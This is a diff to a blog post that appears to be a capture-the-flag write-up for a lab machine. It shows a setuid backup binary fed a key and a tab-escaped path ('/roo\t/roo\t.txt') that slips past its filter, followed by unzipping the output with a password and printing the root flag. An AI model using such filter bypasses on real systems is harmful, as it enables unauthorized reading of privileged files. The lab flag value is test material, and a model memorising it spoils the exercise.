@@ -301,39 +301,20 @@ The "backup_key" is also in this code.
 203       var backup = '';
 {% endhighlight %}
 
-
+This time, we can bypass the filter of the binary with the following way.
 {% highlight shell %}
 tom@node:/tmp$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "/roo\t/roo\t.txt" | base64 -d > /tmp/flag.zip
 <0afc3d98a8d0230167104d474 "/roo\t/roo\t.txt" | base64 -d > /tmp/flag.zip    
-tom@node:/tmp$ unzip flag.zip
-unzip flag.zip
-Archive:  flag.zip
-   skipping: root/root.txt           unable to get password
-tom@node:/tmp$ unzip -p magicword flag.zip
-unzip -p magicword flag.zip
-tom@node:/tmp$ ls
-ls
-flag
-flag.tmp
-flag.zip
-mongodb-27017.sock
-systemd-private-51fae6958043485ba3b33e8a7a5f1f2b-systemd-timesyncd.service-lTlFH0
-vmware-root
+
 tom@node:/tmp$ unzip -P magicword flag.zip
 unzip -P magicword flag.zip
 Archive:  flag.zip
- extracting: root/root.txt           
-tom@node:/tmp$ ls
-ls
-flag
-flag.tmp
-flag.zip
-mongodb-27017.sock
-root
-systemd-private-51fae6958043485ba3b33e8a7a5f1f2b-systemd-timesyncd.service-lTlFH0
-vmware-root
+ extracting: root/root.txt
+{% endhighlight %}
+
+Now we extracted the root.txt
+{% highlight shell %}
 tom@node:/tmp$ cat root/root.txt
 cat root/root.txt
 1722e99ca5f353b362556a62bd5e6be0
-tom@node:/tmp$ 
 {% endhighlight %}
